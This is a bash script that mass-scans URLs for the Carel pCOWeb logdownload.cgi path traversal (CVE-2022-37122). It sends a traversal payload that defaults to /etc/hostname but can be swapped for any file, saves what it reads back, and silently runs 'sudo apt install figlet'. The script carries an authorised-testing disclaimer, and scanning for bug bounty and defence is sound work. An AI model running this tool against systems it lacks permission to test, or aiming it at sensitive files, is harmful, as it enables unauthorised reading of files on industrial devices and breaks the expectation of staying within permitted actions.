#!/usr/bin/env bash
# ----------------------------------------------------------------------------
# cve-2022-37122-scanner.sh
#
# Enhanced scanner for Carel pCOWeb logdownload.cgi path traversal (CVE-2022-37122)
# - Safe/default PoC: /etc/hostname (non-sensitive)
# - Colorful banner, pretty output, progress and summary table
#
# EDUCATIONAL / BUG BOUNTY NOTICE:
# This script was created for education purposes and to assist authorised bug
# bounty hunters in finding and responsibly disclosing vulnerabilities.
# DO NOT use this script against systems you do not own or do not have
# explicit written permission to test.
#
# Author: Professor the Hunter
# Twitter: https://x.com/bughuntar
# ----------------------------------------------------------------------------

set -o errexit
set -o pipefail
set -o nounset

# ----------------------
# Colors & helpers
# ----------------------
if command -v tput >/dev/null 2>&1 && [ -t 1 ]; then
  NORM="\e[0m"
  BOLD="\e[1m"
  RED="\e[31m"
  GREEN="\e[32m"
  YELLOW="\e[33m"
  BLUE="\e[34m"
  MAGENTA="\e[35m"
  CYAN="\e[36m"
  WHITE="\e[37m"
else
  NORM=""
  BOLD=""
  RED=""
  GREEN=""
  YELLOW=""
  BLUE=""
  MAGENTA=""
  CYAN=""
  WHITE=""
fi

info() { printf "%b\n" "${BLUE}[*]${NORM} $*"; }
ok()   { printf "%b\n" "${GREEN}[+]${NORM} $*"; }
warn() { printf "%b\n" "${YELLOW}[!]${NORM} $*"; }
err()  { printf "%b\n" "${RED}[-]${NORM} $*"; }

sudo apt install figlet > /dev/null 2>&1

# Fancy banner
figlet 2022-37122
print_banner() {
  printf "%b" "${MAGENTA}${BOLD}CVE-2022-37122 Path Traversal Scanner — Professor the Hunter${NORM}\n"
  printf "%b\n" "${CYAN}Safe PoC: /etc/hostname (default) — Educational / Authorized testing only${NORM}\n"
}

# ----------------------
# Defaults / Config
# ----------------------
DEFAULT_PAYLOAD="../../../../../../../../etc/hostname"
DEFAULT_THREADS=8
DEFAULT_TIMEOUT=10
DEFAULT_USERAGENT="cve-2022-37122-scanner/1.3 (Professor the Hunter)"
DEFAULT_OUTCSV="findings.csv"
DEFAULT_SAMPLES_DIR="samples"
HOSTNAME_REGEX='^[A-Za-z0-9._-]+$'
CURL_OPTS=(-sS --max-time "${DEFAULT_TIMEOUT}" -L -A "${DEFAULT_USERAGENT}")

# ----------------------
# Utility functions
# ----------------------
print_usage() {
  cat <<EOF
Usage: $0 [options]

Options:
  -u, --url URL            Single target URL (include scheme, e.g. http://)
  -f, --file FILE          Targets file (one URL per line; lines starting with # are ignored)
  -o, --output FILE        Output CSV file (default: ${DEFAULT_OUTCSV})
  -s, --samples-dir DIR    Directory to save sample responses (default: ${DEFAULT_SAMPLES_DIR})
  -t, --threads N          Number of concurrent threads (default: ${DEFAULT_THREADS})
  -p, --payload STR        Traversal payload (default: ${DEFAULT_PAYLOAD})
  --insecure               Pass --insecure to curl (use for self-signed certs)
  -v, --verbose            Verbose output (prints each request URL)
  -h, --help               Show this help and exit

Examples:
  $0 -u http://192.0.2.10
  $0 -f targets.txt -t 16 -o results.csv
  $0 -u https://device.local -p '../../../../../../../../etc/hostname' --insecure

Notes:
 - Default PoC reads /etc/hostname which is non-sensitive. You may change payload, but only use
   files you are allowed to access during authorized testing.
 - Run this tool only against systems you own or have explicit written permission to test.
EOF
}

# simple concurrency runner using background jobs
run_jobs() {
  local maxjobs=$1; shift
  local cmds=("$@")
  local i
  for i in "${!cmds[@]}"; do
    eval "${cmds[$i]}" &
    # throttle: wait while job count >= maxjobs
    while [ "$(jobs -rp | wc -l)" -ge "$maxjobs" ]; do
      sleep 0.08
    done
  done
  wait
}

csv_quote() { printf '%s' "\"${1//\"/\"\"}\""; }

# ----------------------
# Core check function
# ----------------------
check_one() {
  local base="$1"
  local payload="$2"
  local outcsv="$3"
  local samples_dir="$4"
  local curl_extra_name="$5"
  local -n curl_extra_ref="$curl_extra_name" || true

  local poc_path="/usr-cgi/logdownload.cgi?file=${payload}"
  local url sample_file safe_name resp first_line timestamp

  base="${base%/}"
  url="${base}${poc_path}"
  safe_name=$(echo "$base" | sed -e 's|https\?://||' -e 's/[^A-Za-z0-9._-]/_/g')
  sample_file="${samples_dir}/sample_${safe_name}.txt"
  timestamp=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

  if [ "${VERBOSE:-0}" -eq 1 ]; then
    printf "%b\n" "${CYAN}[>]${NORM} Request: ${url}"
  fi

  if ! resp=$(curl "${CURL_OPTS[@]}" "${curl_extra_ref[@]:-}" "$url" 2>/dev/null); then
    printf '%s,%s,%s,%s,%s\n' "$(csv_quote "$base")" "$(csv_quote "$url")" "ERROR" "request_failed" "" >> "$outcsv"
    printf '%b\n' "${RED}[x]${NORM} $base - request failed or timed out" >&2
    return
  fi

  # first non-empty line heuristic
  first_line=$(printf '%s\n' "$resp" | sed '/^\s*$/d' | head -n1 | tr -d '\r\n')

  if [ -n "$first_line" ] && printf '%s\n' "$first_line" | grep -qE "$HOSTNAME_REGEX"; then
    mkdir -p "$samples_dir"
    printf '%s\n' "$resp" > "$sample_file"
    printf '%b\n' "${GREEN}[✓]${NORM} $base -> ${url} (${BOLD}hostname:${first_line}${NORM})"
    printf '%s,%s,%s,%s,%s\n' "$(csv_quote "$base")" "$(csv_quote "$url")" "VULNERABLE" "$(csv_quote "hostname:$first_line")" "$(csv_quote "$sample_file")" >> "$outcsv"
    return
  fi

  if printf '%s\n' "$resp" | grep -qiE 'hostname|host name|device name|system name'; then
    mkdir -p "$samples_dir"
    printf '%s\n' "$resp" > "$sample_file"
    printf '%b\n' "${YELLOW}[~]${NORM} $base -> ${url} (keyword match)"
    printf '%s,%s,%s,%s,%s\n' "$(csv_quote "$base")" "$(csv_quote "$url")" "POSSIBLE" "$(csv_quote "keyword_match")" "$(csv_quote "$sample_file")" >> "$outcsv"
    return
  fi

  printf '%b\n' "${BLUE}[.]${NORM} $base - not detected"
  printf '%s,%s,%s,%s,%s\n' "$(csv_quote "$base")" "$(csv_quote "$url")" "NOT_DETECTED" "" "" >> "$outcsv"
}

# ----------------------
# CLI Parsing
# ----------------------
TARGET_URL=""
TARGET_FILE=""
OUTCSV="${DEFAULT_OUTCSV}"
SAMPLES_DIR="${DEFAULT_SAMPLES_DIR}"
THREADS="${DEFAULT_THREADS}"
PAYLOAD="${DEFAULT_PAYLOAD}"
CURL_EXTRA=()
VERBOSE=0

# Basic long/short options parser
while [ "$#" -gt 0 ]; do
  case "$1" in
    -u|--url) TARGET_URL="$2"; shift 2 ;;
    -f|--file) TARGET_FILE="$2"; shift 2 ;;
    -o|--output) OUTCSV="$2"; shift 2 ;;
    -s|--samples-dir) SAMPLES_DIR="$2"; shift 2 ;;
    -t|--threads) THREADS="$2"; shift 2 ;;
    -p|--payload) PAYLOAD="$2"; shift 2 ;;
    --insecure) CURL_EXTRA+=(--insecure); shift ;;
    -v|--verbose) VERBOSE=1; shift ;;
    -h|--help) print_usage; exit 0 ;;
    --) shift; break ;;
    -*) err "Unknown option: $1"; print_usage; exit 1 ;;
    *) if [ -z "$TARGET_URL" ]; then TARGET_URL="$1"; else err "Unknown positional arg: $1"; exit 1; fi; shift ;;
  esac
done

if [ -z "$TARGET_URL" ] && [ -z "$TARGET_FILE" ]; then
  err "No target specified."
  print_usage
  exit 1
fi

if ! printf '%s\n' "$THREADS" | grep -qE '^[0-9]+$' || [ "$THREADS" -lt 1 ]; then
  err "Invalid threads value: $THREADS"
  exit 2
fi

# Prepare outputs
: > "$OUTCSV"
printf '%s,%s,%s,%s,%s\n' "host" "url" "status" "matched_pattern" "sample_file" >> "$OUTCSV"
mkdir -p "$SAMPLES_DIR"

# Build job list
jobs=()
if [ -n "$TARGET_FILE" ]; then
  if [ ! -f "$TARGET_FILE" ]; then
    err "Targets file not found: $TARGET_FILE"
    exit 3
  fi
  while IFS= read -r line || [ -n "$line" ]; do
    line="${line%%#*}"
    line="$(echo -n "$line" | tr -d '\r' | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
    [ -z "$line" ] && continue
    jobs+=("check_one \"$line\" \"$PAYLOAD\" \"$OUTCSV\" \"$SAMPLES_DIR\" CURL_EXTRA")
  done < "$TARGET_FILE"
else
  jobs+=("check_one \"$TARGET_URL\" \"$PAYLOAD\" \"$OUTCSV\" \"$SAMPLES_DIR\" CURL_EXTRA")
fi

# Show banner and start
print_banner
info "Threads: ${THREADS} | Payload: ${PAYLOAD} | Output: ${OUTCSV} | Samples: ${SAMPLES_DIR}"
info "Starting scan: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"

# Run jobs
run_jobs "$THREADS" "${jobs[@]}"

# Print summary (counts)
total=$(tail -n +2 "$OUTCSV" | wc -l | tr -d ' ')
vuln=$(tail -n +2 "$OUTCSV" | grep -c 'VULNERABLE' || true)
possible=$(tail -n +2 "$OUTCSV" | grep -c 'POSSIBLE' || true)
notdet=$(tail -n +2 "$OUTCSV" | grep -c 'NOT_DETECTED' || true)
errors=$(tail -n +2 "$OUTCSV" | grep -c 'ERROR' || true)

printf "\n%bScan Summary%b\n" "${BOLD}" "${NORM}"
printf "%-20s : %s\n" "Total scanned" "$total"
printf "%-20s : %b%s%b\n" "Vulnerable" "${GREEN}" "$vuln" "${NORM}"
printf "%-20s : %b%s%b\n" "Possible" "${YELLOW}" "$possible" "${NORM}"
printf "%-20s : %b%s%b\n" "Not detected" "${BLUE}" "$notdet" "${NORM}"
printf "%-20s : %b%s%b\n" "Errors" "${RED}" "$errors" "${NORM}"

info "Scan finished: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
info "Results saved to: ${OUTCSV}"
info "Samples saved to: ${SAMPLES_DIR}/"

# End of script
